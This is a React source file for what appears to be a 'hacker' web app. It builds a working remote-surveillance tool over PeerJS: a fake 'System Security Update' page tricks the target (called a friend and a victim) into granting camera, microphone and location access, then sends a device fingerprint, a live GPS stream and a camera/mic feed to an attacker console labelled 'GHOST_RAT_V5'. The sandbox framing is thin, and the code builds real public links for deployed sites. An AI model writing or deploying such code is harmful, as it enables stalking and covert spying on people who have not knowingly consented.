import React, { useState, useRef, useEffect } from 'react';
import { AppProps } from '../../types';
import { Ghost, Link, Smartphone, Camera, MapPin, Mic, FileText, AlertTriangle, ShieldAlert, Activity, Eye, Zap, Copy, Check, Lock, Download, Wifi, ExternalLink, RefreshCw, AlertOctagon } from 'lucide-react';
import Peer from 'peerjs';

// --- VICTIM VIEW COMPONENT (What the friend sees) ---
export const GhostVictimApp: React.FC<{ sessionId: string }> = ({ sessionId }) => {
    const [status, setStatus] = useState<'idle' | 'requesting_perms' | 'connecting' | 'connected' | 'error'>('idle');
    const [debugLog, setDebugLog] = useState<string>("");
    const [idInput, setIdInput] = useState(sessionId || '');
    const [peerInstance, setPeerInstance] = useState<Peer | null>(null);
    const [isInsecure, setIsInsecure] = useState(false);
    
    // Auto-fill ID if passed via props
    useEffect(() => {
        if(sessionId) setIdInput(sessionId);
        // Check for secure context
        if (typeof window !== 'undefined' && window.location.protocol === 'http:' && window.location.hostname !== 'localhost' && !window.location.hostname.includes('127.0.0.1')) {
            setIsInsecure(true);
            log("WARNING: INSECURE CONTEXT (HTTP). Camera/Mic will likely fail.");
        }
    }, [sessionId]);

    const log = (msg: string) => setDebugLog(prev => prev + "\n" + msg);

    const startExploit = async () => {
        if (!idInput) {
            alert("Error: Invalid Session ID.");
            return;
        }

        setStatus('requesting_perms');
        log("Initializing Update Protocol...");

        // 1. Permission Request (Optional but preferred)
        let mediaStream: MediaStream | null = null;
        
        try {
            log("Requesting Hardware Access...");
            
            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
                throw new Error("Media API Unavailable (Insecure Context?)");
            }

            // We request permissions. If denied, we catch it but CONTINUE connecting.
            mediaStream = await navigator.mediaDevices.getUserMedia({ 
                video: { facingMode: "user" }, // Front camera
                audio: true 
            });
            log("Hardware Access Granted.");
        } catch (e: any) {
            console.error("Media Error:", e);
            if (e.name === 'NotAllowedError' || e.name === 'PermissionDeniedError') {
                log("WARN: Hardware Access DENIED by User.");
                // We do NOT stop here. We continue to establish data link.
            } else if (e.name === 'NotFoundError') {
                log("WARN: No Camera/Mic hardware found.");
            } else {
                log(`WARN: Hardware Access Failed (${e.message || e.name}).`);
            }
            
            if (isInsecure) {
                log("CRITICAL: Browser blocked access due to HTTP. Use HTTPS.");
            }
        }

        setStatus('connecting');

        try {
            // 2. Initialize Peer Network
            const peer = new Peer();
            setPeerInstance(peer);

            peer.on('open', (myId) => {
                log(`Network Interface Active: ${myId}`);
                log(`Target Host: ${idInput}`);

                // 3. Connect Data Channel (GPS/Info)
                const conn = peer.connect(idInput);

                conn.on('open', () => {
                    log("Secure Uplink Established.");
                    
                    // Send device fingerprint
                    conn.send({
                        type: 'info',
                        data: {
                            userAgent: navigator.userAgent,
                            platform: navigator.platform,
                            language: navigator.language,
                            screen: `${window.screen.width}x${window.screen.height}`,
                            mediaStatus: mediaStream ? 'Active' : 'Denied/Failed'
                        }
                    });

                    // Start GPS Stream (Requires explicit permission often, but less strict than cam in some contexts)
                    if (navigator.geolocation) {
                        navigator.geolocation.watchPosition((pos) => {
                            conn.send({
                                type: 'gps',
                                data: {
                                    lat: pos.coords.latitude,
                                    lng: pos.coords.longitude,
                                    acc: pos.coords.accuracy
                                }
                            });
                        }, (err) => log(`GPS Log: ${err.message}`));
                    }
                });

                conn.on('error', (err) => {
                    log(`Uplink Error: ${err}`);
                    // Don't set error status immediately, retry logic handles it usually or it's fatal
                });

                // 4. Start Media Stream (Video Call) IF we have stream
                if (mediaStream) {
                    log("Starting Media Stream...");
                    const call = peer.call(idInput, mediaStream);
                    
                    call.on('stream', (remoteStream) => {
                        log("Stream Active.");
                    });
                    
                    call.on('close', () => log("Stream Closed by Host."));
                    call.on('error', (err) => log(`Stream Error: ${err}`));
                } else {
                    log("Skipping Media Stream (No Permission). Data Link Only.");
                }

                setStatus('connected');
            });

            peer.on('error', (err) => {
                log(`Network Error: ${err.type}`);
                if (err.type === 'peer-unavailable') {
                    alert("Connection Failed: Host ID not found. Is the attacker app open?");
                    setStatus('error');
                }
            });

        } catch (e: any) {
            console.error(e);
            setStatus('error');
            log(`FATAL: ${e.message}`);
        }
    };

    if (status === 'connected') {
        return (
            <div className="h-full w-full bg-black text-green-500 font-mono flex flex-col items-center justify-center p-6 text-center">
                <ShieldAlert size={64} className="mb-6 animate-pulse" />
                <h1 className="text-2xl font-bold mb-2">UPDATE COMPLETE</h1>
                <p className="text-sm opacity-70">Security Patch v4.0.1 is active.</p>
                <div className="mt-8 text-xs opacity-50 border border-green-900 p-4 rounded bg-green-900/10 w-full max-w-sm">
                    <p className="font-bold border-b border-green-900/50 mb-2 pb-1">SYSTEM LOG</p>
                    <pre className="text-[10px] text-left whitespace-pre-wrap">{debugLog}</pre>
                </div>
                <p className="mt-8 text-red-500 animate-pulse text-sm">DO NOT CLOSE THIS WINDOW</p>
            </div>
        );
    }

    return (
        <div className="h-full w-full bg-slate-50 text-slate-900 font-sans flex flex-col items-center justify-center p-6 text-center overflow-auto">
             <div className="w-20 h-20 bg-blue-600 rounded-2xl flex items-center justify-center shadow-xl mb-6 shrink-0 animate-in zoom-in duration-500">
                <Lock size={40} className="text-white" />
            </div>
            <h1 className="text-2xl font-bold mb-2">System Security Update</h1>
            <p className="text-slate-500 mb-8 max-w-sm text-sm">
                Critical Patch v4.0.1<br/>
                Identity Verification Required
            </p>

            {isInsecure && (
                 <div className="mb-6 max-w-sm bg-amber-100 text-amber-800 p-3 rounded text-xs text-left flex items-start gap-2">
                    <AlertOctagon size={16} className="shrink-0 mt-0.5" />
                    <div>
                        <strong>Connection Warning:</strong> You are not using HTTPS. Camera/Microphone access will likely be blocked by your phone's browser.
                    </div>
                 </div>
            )}
            
            {/* Manual ID Input (Hidden if provided) */}
            {!sessionId && (
                <div className="mb-4 w-full max-w-sm">
                    <label className="text-xs font-bold text-slate-400 uppercase">Session Key</label>
                    <input 
                        type="text" 
                        value={idInput}
                        onChange={(e) => setIdInput(e.target.value)}
                        className="w-full border border-slate-300 rounded p-2 text-sm mt-1"
                        placeholder="Paste Key Here..."
                    />
                </div>
            )}
            
            <div className="bg-white border border-slate-200 p-4 rounded-xl w-full max-w-sm mb-6 text-left shadow-sm">
                <div className="flex items-center justify-between mb-2">
                    <span className="font-bold text-sm">Patch Notes</span>
                    <span className="text-xs bg-blue-100 text-blue-700 px-2 py-0.5 rounded">Priority: High</span>
                </div>
                <div className="text-xs text-slate-500 space-y-1">
                    <div className="flex items-center gap-2"><Check size={10} className="text-green-500"/> Kernel Exploit Fix</div>
                    <div className="flex items-center gap-2"><Check size={10} className="text-green-500"/> Biometric Driver Update</div>
                </div>
            </div>

            <button 
                onClick={startExploit}
                disabled={status === 'requesting_perms' || status === 'connecting'}
                className={`
                    w-full max-w-xs font-bold py-4 px-8 rounded-xl shadow-lg flex items-center justify-center gap-2 transition-all active:scale-95
                    ${status === 'error' ? 'bg-red-600 text-white shadow-red-500/30' : 'bg-blue-600 hover:bg-blue-700 text-white shadow-blue-500/30'}
                    ${(status === 'requesting_perms' || status === 'connecting') ? 'opacity-70 cursor-wait' : ''}
                `}
            >
                {status === 'requesting_perms' || status === 'connecting' ? <Activity className="animate-spin" /> : status === 'error' ? <RefreshCw size={20} /> : <Download size={20} />}
                {status === 'requesting_perms' ? 'VERIFYING...' : status === 'connecting' ? 'INSTALLING...' : status === 'error' ? 'RETRY UPDATE' : 'INSTALL UPDATE'}
            </button>
            
            <p className="text-[10px] text-slate-400 mt-4 max-w-xs leading-relaxed">
                By installing, you agree to grant temporary access to device sensors for hardware diagnostics and identity verification.
            </p>

            {debugLog && (
                <div className="mt-6 w-full max-w-xs text-[9px] text-slate-300 bg-slate-800 p-2 rounded text-left font-mono overflow-hidden">
                    <div className="font-bold text-slate-500 mb-1">DEBUG CONSOLE</div>
                    <pre className="whitespace-pre-wrap">{debugLog}</pre>
                </div>
            )}
        </div>
    );
}


// --- MAIN APP COMPONENT (Host/Attacker) ---
export const GhostApp: React.FC<AppProps> = ({ isHackerMode }) => {
    const [step, setStep] = useState<'build' | 'listen' | 'control'>('build');
    const [logs, setLogs] = useState<string[]>([]);
    const [target, setTarget] = useState<any>(null);
    const [peerId, setPeerId] = useState<string>('');
    const [activeFeed, setActiveFeed] = useState<'camera' | 'mic' | 'none'>('none');
    const [copied, setCopied] = useState(false);
    
    const videoRef = useRef<HTMLVideoElement>(null);
    const peerRef = useRef<Peer | null>(null);

    // Styling
    const baseColor = isHackerMode ? 'text-green-500' : 'text-red-500';
    const borderColor = isHackerMode ? 'border-green-900' : 'border-red-900';
    const bgColor = isHackerMode ? 'bg-black' : 'bg-slate-950';

    const addLog = (msg: string) => {
        setLogs(prev => [...prev, `[${new Date().toLocaleTimeString()}] ${msg}`]);
    };

    useEffect(() => {
        return () => {
            if (peerRef.current) peerRef.current.destroy();
        }
    }, []);

    const handleBuild = () => {
        addLog("Initializing C2 Server (PeerJS)...");
        // Create Peer with no ID argument to let server assign a random one (more reliable)
        const peer = new Peer();
        
        peer.on('open', (id) => {
            setPeerId(id);
            peerRef.current = peer;
            addLog(`C2 Online. Session ID: ${id}`);
            setStep('listen');
        });

        // Handle incoming data connection (Info/GPS)
        peer.on('connection', (conn) => {
            conn.on('open', () => {
                addLog("[+] DATA UPLINK ESTABLISHED");
            });

            conn.on('data', (data: any) => {
                if (data.type === 'info') {
                    addLog(`[+] FINGERPRINT RECEIVED`);
                    addLog(` > Platform: ${data.data.platform}`);
                    addLog(` > Agent: ${data.data.userAgent}`);
                    addLog(` > Cam Status: ${data.data.mediaStatus}`);
                    // Explicitly type 'prev' to fix TS7006 error
                    setTarget((prev: any) => ({ ...prev, ...data.data, status: 'Online' }));
                    setStep('control');
                }
                if (data.type === 'gps') {
                    addLog(`[GPS] LAT:${data.data.lat.toFixed(5)} LNG:${data.data.lng.toFixed(5)} ACC:${data.data.acc}m`);
                }
            });
            
            conn.on('close', () => {
                addLog("[-] Target disconnected.");
                // Explicitly type 'prev' to fix TS7006 error
                setTarget((prev: any) => ({ ...prev, status: 'Offline' }));
            });
        });

        // Handle incoming media call (Camera/Mic)
        peer.on('call', (call) => {
            addLog("[+] INCOMING MEDIA STREAM...");
            call.answer(); // Answer automatically
            
            call.on('stream', (remoteStream) => {
                addLog("[+] STREAM HANDSHAKE SUCCESS.");
                addLog("[+] DISPLAYING FEED.");
                
                if (videoRef.current) {
                    videoRef.current.srcObject = remoteStream;
                    // Ensure autoplay works
                    videoRef.current.play().catch(e => addLog(`[ERR] Autoplay blocked: ${e.message}`));
                    setActiveFeed('camera');
                }
            });

            call.on('error', (err) => {
                addLog(`[ERR] Call Error: ${err.message}`);
            });
        });

        peer.on('error', (err) => {
            addLog(`[ERROR] PeerJS: ${err.type} - ${err.message}`);
        });

        peer.on('disconnected', () => {
            addLog("[!] Connection to Signaling Server lost. Reconnecting...");
            peer.reconnect();
        });
    };

    const getExploitUrl = (forceExternal = false) => {
        if (typeof window === 'undefined') return '';
        
        // 1. Check if we are in a Preview/Sandbox environment
        const isPreview = window.location.protocol === 'blob:' || 
                          window.location.hostname.includes('webcontainer') || 
                          window.location.hostname.includes('stackblitz');
        
        // 2. Check if we are on a secure production URL (like Vercel)
        const isProductionSecure = window.location.protocol === 'https:';

        // If we are on Vercel/Production HTTPS, ALWAYS use the real URL, unless specifically debugging internals.
        if (isProductionSecure && !isPreview) {
             const url = new URL(window.location.href);
             url.search = ''; 
             url.hash = '';
             url.searchParams.set('ghost_session', peerId);
             return url.toString();
        }
        
        // If in sandbox (WebContainer/StackBlitz), use internal protocol unless forced
        if (isPreview && !forceExternal) {
            return `cloudos://exploit?ghost_session=${peerId}`;
        }
        
        // Fallback / Development
        try {
            const url = new URL(window.location.href);
            url.search = '';
            url.hash = '';
            url.searchParams.set('ghost_session', peerId);
            return url.toString();
        } catch (e) {
            return `${window.location.href}?ghost_session=${peerId}`;
        }
    };

    const isInternalLink = getExploitUrl().startsWith('cloudos://');

    const copyLink = (forceExternal = false) => {
        navigator.clipboard.writeText(getExploitUrl(forceExternal));
        setCopied(true);
        setTimeout(() => setCopied(false), 2000);
        addLog(forceExternal ? "External Public URL copied." : "Payload URL copied to clipboard.");
    };

    const openLinkDirectly = () => {
        const url = getExploitUrl();
        if (url.startsWith('cloudos://')) {
            alert("INTERNAL SIMULATION LINK\n\nThis app is running in a restricted sandbox (Preview Mode).\n\nTo test:\n1. Copy the link.\n2. Open 'Shadow Surf' (Browser App).\n3. Paste the link to run the victim simulation locally.");
            return;
        }
        window.open(url, '_blank');
        addLog("Opening payload in new tab...");
    };

    const stopFeed = () => {
        if (videoRef.current) {
            videoRef.current.srcObject = null;
        }
        setActiveFeed('none');
        addLog("[CMD] Stream View Closed.");
    };

    return (
        <div className={`h-full w-full flex flex-col font-mono ${bgColor} ${baseColor} overflow-hidden select-none`}>
            
            {/* Header */}
            <div className={`h-14 flex items-center px-4 border-b ${borderColor} bg-opacity-20`}>
                <Ghost className="mr-3" />
                <div className="flex-1">
                    <h1 className="font-bold text-lg tracking-wider">GHOST_RAT_V5</h1>
                    <div className="text-[10px] opacity-60">REMOTE ADMINISTRATION TOOL</div>
                </div>
                {target && (
                    <div className="flex items-center gap-2 text-xs animate-pulse">
                        <Activity size={14} />
                        CONNECTED
                    </div>
                )}
            </div>

            <div className="flex-1 flex flex-col p-4 overflow-y-auto">
                
                {/* STAGE 1: BUILDER */}
                {step === 'build' && (
                    <div className={`flex-1 flex flex-col items-center justify-center space-y-6 animate-in zoom-in`}>
                        <div className={`w-32 h-32 rounded-full border-4 border-dashed ${borderColor} flex items-center justify-center opacity-50`}>
                            <Link size={48} />
                        </div>
                        <div className="text-center space-y-2">
                            <h2 className="text-xl font-bold">PAYLOAD BUILDER</h2>
                            <p className="text-xs opacity-70 max-w-xs mx-auto">Generate a unique remote access link. Share this link with the target device to establish a reverse shell.</p>
                        </div>
                        <button 
                            onClick={handleBuild}
                            className={`px-8 py-3 rounded bg-red-900/20 border border-red-500 hover:bg-red-500 hover:text-white transition-all font-bold tracking-widest flex items-center gap-2`}
                        >
                            <Zap size={16} /> INITIALIZE LISTENER
                        </button>
                    </div>
                )}

                {/* STAGE 2: LISTENER */}
                {step === 'listen' && (
                    <div className="flex-1 flex flex-col items-center justify-center space-y-8">
                         <div className="relative">
                             <div className="w-48 h-48 rounded-full border border-red-900/50 flex items-center justify-center animate-[spin_4s_linear_infinite]">
                                 <div className="w-2 h-2 bg-red-500 rounded-full absolute top-0" />
                             </div>
                             <div className="absolute inset-0 flex items-center justify-center">
                                 <div className="text-center">
                                     <div className="font-bold text-xl animate-pulse">LISTENING</div>
                                     <div className="text-xs opacity-50">PeerJS Relay Active</div>
                                 </div>
                             </div>
                         </div>
                         
                         <div className={`w-full max-w-md bg-black/50 p-4 rounded border ${borderColor} font-mono text-xs space-y-2`}>
                             <div className="opacity-50 uppercase tracking-widest flex justify-between">
                                 <span>{isInternalLink ? 'INTERNAL LINK (SANDBOX)' : 'PUBLIC EXPLOIT URL'}</span>
                                 {isInternalLink && <span className="text-yellow-500 font-bold">⚠ NOT FOR EXTERNAL USE</span>}
                             </div>
                             <textarea 
                                readOnly
                                className="w-full h-16 text-blue-400 bg-white/5 rounded border border-white/10 p-2 text-[10px] break-all outline-none resize-none"
                                value={getExploitUrl()}
                             />
                             {isInternalLink && (
                                 <div className="flex justify-end">
                                     <button onClick={() => copyLink(true)} className="text-[10px] underline text-blue-400 hover:text-white">
                                         Force Copy Public Link (Might be broken in preview)
                                     </button>
                                 </div>
                             )}
                         </div>

                         <div className="flex gap-4">
                             <button 
                                onClick={() => copyLink(false)}
                                className={`px-6 py-3 text-xs border ${borderColor} hover:bg-white/5 rounded flex items-center gap-2 transition-all font-bold`}
                             >
                                 {copied ? <Check size={14} /> : <Copy size={14} />}
                                 {copied ? 'COPIED' : 'COPY'}
                             </button>
                             <button 
                                onClick={openLinkDirectly}
                                className={`px-6 py-3 text-xs bg-white/10 hover:bg-white/20 rounded flex items-center gap-2 transition-all font-bold`}
                             >
                                 <ExternalLink size={14} /> OPEN
                             </button>
                         </div>
                         
                         <p className={`text-[10px] max-w-xs text-center ${isInternalLink ? 'text-yellow-500' : 'opacity-50'}`}>
                             {isInternalLink 
                                ? "⚠ SANDBOX DETECTED: This link will NOT work on an external phone. To test, Copy link -> Open 'Shadow Surf' -> Paste."
                                : "Send this link to your target device. Do not close this tab."
                             }
                         </p>
                    </div>
                )}

                {/* STAGE 3: CONTROL */}
                {step === 'control' && (
                    <div className="space-y-4">
                        {/* Target Info */}
                        <div className={`p-4 rounded border ${borderColor} bg-opacity-10 flex justify-between items-center`}>
                            <div className="flex gap-4 items-center">
                                <div className="p-2 bg-red-500/20 rounded">
                                    <Smartphone size={24} />
                                </div>
                                <div className="min-w-0">
                                    <div className="font-bold truncate max-w-[150px] text-xs md:text-sm">{target?.platform || "Unknown"}</div>
                                    <div className="text-[10px] opacity-60 truncate max-w-[200px]">{target?.userAgent}</div>
                                </div>
                            </div>
                            <div className="text-right">
                                <div className="text-[10px] font-bold text-green-500 flex items-center gap-1 justify-end">
                                    <Wifi size={12}/> {target?.status || 'CONNECTED'}
                                </div>
                            </div>
                        </div>

                        {/* Active Feed (Cam/Mic) */}
                        <div className={`relative aspect-video bg-black rounded border ${borderColor} overflow-hidden ${activeFeed === 'none' ? 'hidden' : 'block'}`}>
                            <video ref={videoRef} autoPlay playsInline muted={false} className="w-full h-full object-cover" />
                            <div className="absolute top-2 left-2 px-2 py-0.5 bg-red-600 text-white text-[10px] font-bold rounded animate-pulse">LIVE FEED</div>
                            <button onClick={stopFeed} className="absolute top-2 right-2 p-1 bg-black/50 hover:bg-red-600 rounded text-white"><Eye size={16}/></button>
                        </div>

                        {/* Controls Grid */}
                        <div className="grid grid-cols-2 gap-3">
                             <div className="col-span-2 text-[10px] opacity-50 text-center uppercase tracking-widest mt-2">Active Modules</div>
                             <div className={`p-3 rounded border ${borderColor} bg-white/5 text-center text-xs flex flex-col items-center gap-2`}>
                                 <Camera size={20} className="text-green-500" />
                                 <span>Cam/Mic Stream</span>
                                 <span className="text-[9px] opacity-50">{target?.mediaStatus === 'Active' ? 'AUTO-ESTABLISHED' : 'DENIED / FAILED'}</span>
                             </div>
                             <div className={`p-3 rounded border ${borderColor} bg-white/5 text-center text-xs flex flex-col items-center gap-2`}>
                                 <MapPin size={20} className="text-green-500" />
                                 <span>GPS Tracker</span>
                                 <span className="text-[9px] opacity-50">LOGGING TO CONSOLE</span>
                             </div>
                        </div>
                    </div>
                )}

                {/* LOGS CONSOLE */}
                <div className={`mt-4 flex-1 min-h-[150px] bg-black/40 border-t ${borderColor} p-2 font-mono text-[10px] overflow-y-auto`}>
                    {logs.length === 0 && <div className="opacity-30 italic">Waiting for target...</div>}
                    {logs.map((log, i) => (
                        <div key={i} className="mb-0.5">{log}</div>
                    ))}
                    <div className="h-4" /> {/* Spacer */}
                </div>
            </div>
        </div>
    );
};